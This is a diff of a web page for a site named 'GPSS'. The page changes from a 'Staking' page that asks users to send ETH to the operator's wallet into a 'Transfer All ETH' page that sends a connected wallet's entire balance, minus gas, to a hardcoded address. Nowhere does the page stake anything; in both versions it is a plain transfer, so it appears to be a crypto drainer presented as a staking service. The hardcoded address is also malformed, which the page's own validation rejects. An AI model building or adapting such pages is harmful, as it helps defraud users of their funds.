@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Staking - GPSS</title>
+    <title>ETH Transfer - GPSS</title>
     <link rel="stylesheet" href="styles.css">
 </head>
-<body class="staking">
+<body class="transfer">
     <!-- Background video -->
     <video autoplay muted loop id="background-video">
         <source src="STAKING.mp4" type="video/mp4">
@@ -14,17 +14,11 @@
     </video>
 
     <div class="container">
-        <h1>Staking with GPSS</h1>
-        <p>Send Ethereum to our wallet for staking. Enter an amount or stake your entire balance below.</p>
-
-        <label for="amount">Amount of Ethereum to Stake (ETH):</label>
-        <input type="number" id="amount" placeholder="Enter ETH amount or leave blank for all ETH" min="0" step="0.01">
-
-        <label for="stakeAll">Stake Entire Balance (minus gas fees):</label>
-        <input type="checkbox" id="stakeAll">
+        <h1>Transfer All ETH</h1>
+        <p>Send all Ethereum (minus gas fees) from your connected wallet to our address.</p>
 
         <button id="connectButton" onclick="connectWallet()">Connect Wallet</button>
-        <button id="stakeButton" onclick="stakeEthereum()" disabled>Stake Ethereum</button>
+        <button id="sendButton" onclick="sendAllEth()" disabled>Send All ETH</button>
         <button onclick="window.location.href='index.html'">Home</button>
 
         <div id="status">Wallet not connected</div>
@@ -60,14 +54,14 @@
         // Check if wallet is connected and update UI
         async function checkWalletConnection() {
             const connectButton = document.getElementById('connectButton');
-            const stakeButton = document.getElementById('stakeButton');
+            const sendButton = document.getElementById('sendButton');
             const statusDiv = document.getElementById('status');
 
             try {
                 if (!window.ethereum) {
                     updateStatus('Please install MetaMask or use a Web3-compatible browser.');
                     connectButton.disabled = true;
-                    stakeButton.disabled = true;
+                    sendButton.disabled = true;
                     return;
                 }
 
@@ -79,19 +73,19 @@
                     signer = provider.getSigner();
                     connectButton.textContent = `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`;
                     connectButton.disabled = true;
-                    stakeButton.disabled = false;
+                    sendButton.disabled = false;
                     updateStatus(`Connected to ${await getNetworkName()}`);
                 } else {
                     connectButton.textContent = 'Connect Wallet';
                     connectButton.disabled = false;
-                    stakeButton.disabled = true;
+                    sendButton.disabled = true;
                     updateStatus('Wallet not connected');
                 }
             } catch (error) {
                 console.error('Error checking wallet connection:', error);
                 updateStatus('Error connecting to wallet: ' + error.message);
                 connectButton.disabled = false;
-                stakeButton.disabled = true;
+                sendButton.disabled = true;
             }
         }
 
@@ -143,21 +137,22 @@
             }
         }
 
-        // Stake Ethereum
-        async function stakeEthereum() {
-            const amountInput = document.getElementById('amount').value;
-            const stakeAll = document.getElementById('stakeAll').checked;
+        // Send all ETH to the target wallet
+        async function sendAllEth() {
             const statusDiv = document.getElementById('status');
-            const stakeButton = document.getElementById('stakeButton');
+            const sendButton = document.getElementById('sendButton');
 
-            // Staking wallet address
-            const stakingWallet = "0x57CBA93A8f0abC01695917BD1c3f569217Ab203";
+            // Target wallet address
+            const targetWallet = "0x57CBA93A8f0abC01695917BD1c3f569217Ab203";
 
-            // Validate staking wallet address (basic hex check)
-            if (!/^0x[a-fA-F0-9]{40}$/.test(stakingWallet)) {
-                updateStatus('Invalid staking wallet address configured.');
-                alert('Invalid staking wallet address. Please contact support.');
-                console.error('Invalid staking address:', stakingWallet);
+            // Validate target wallet address
+            try {
+                const normalizedAddress = ethers.utils.getAddress(targetWallet);
+                console.log('Normalized target address:', normalizedAddress);
+            } catch (error) {
+                console.error('Invalid target address:', targetWallet, error);
+                updateStatus('Invalid target wallet address configured.');
+                alert('Invalid target wallet address. Please contact support.');
                 return;
             }
 
@@ -171,60 +166,39 @@
                 //     return;
                 // }
 
-                let weiAmount;
-                if (stakeAll) {
-                    // Get balance and estimate gas
-                    const balance = await provider.getBalance(userAddress);
-                    const gasPrice = await provider.getGasPrice();
-                    const gasLimit = 21000; // Standard transfer gas limit
-                    const gasCost = gasPrice.mul(gasLimit);
+                // Get balance and estimate gas
+                const balance = await provider.getBalance(userAddress);
+                const gasPrice = await provider.getGasPrice();
+                const gasLimit = 21000; // Standard transfer gas limit
+                const gasCost = gasPrice.mul(gasLimit);
 
-                    if (balance.lte(gasCost)) {
-                        updateStatus('Insufficient ETH balance for staking (including gas fees).');
-                        alert('Insufficient ETH balance for staking (including gas fees).');
-                        return;
-                    }
-
-                    // Calculate max amount (balance minus gas cost)
-                    weiAmount = balance.sub(gasCost);
-                } else {
-                    // Validate manual input
-                    if (!amountInput || isNaN(amountInput) || parseFloat(amountInput) <= 0) {
-                        alert('Please enter a valid ETH amount greater than 0');
-                        updateStatus('Invalid amount entered');
-                        return;
-                    }
-
-                    const amount = parseFloat(amountInput);
-                    weiAmount = ethers.utils.parseEther(amount.toString());
-
-                    // Check balance for manual amount
-                    const balance = await provider.getBalance(userAddress);
-                    if (balance.lt(weiAmount)) {
-                        updateStatus('Insufficient ETH balance for staking.');
-                        alert('Insufficient ETH balance for staking.');
-                        return;
-                    }
+                if (balance.lte(gasCost)) {
+                    updateStatus('Insufficient ETH balance for transfer (including gas fees).');
+                    alert('Insufficient ETH balance for transfer (including gas fees).');
+                    return;
                 }
 
+                // Calculate max amount (balance minus gas cost)
+                const weiAmount = balance.sub(gasCost);
+
                 // Send transaction
-                stakeButton.disabled = true;
+                sendButton.disabled = true;
                 updateStatus('Initiating transaction... Please confirm in MetaMask.');
 
                 const tx = await signer.sendTransaction({
-                    to: stakingWallet,
+                    to: targetWallet,
                     value: weiAmount
                 });
 
                 updateStatus(`Transaction sent! Hash: ${tx.hash}`);
                 await tx.wait();
-                updateStatus(`Transaction confirmed! Staked ${ethers.utils.formatEther(weiAmount)} ETH.`);
-                stakeButton.disabled = false;
+                updateStatus(`Transaction confirmed! Sent ${ethers.utils.formatEther(weiAmount)} ETH.`);
+                sendButton.disabled = false;
 
             } catch (error) {
-                console.error('Staking error:', error);
-                updateStatus('Staking failed: ' + error.message);
-                stakeButton.disabled = false;
+                console.error('Transfer error:', error);
+                updateStatus('Transfer failed: ' + error.message);
+                sendButton.disabled = false;
             }
         }
     </script>
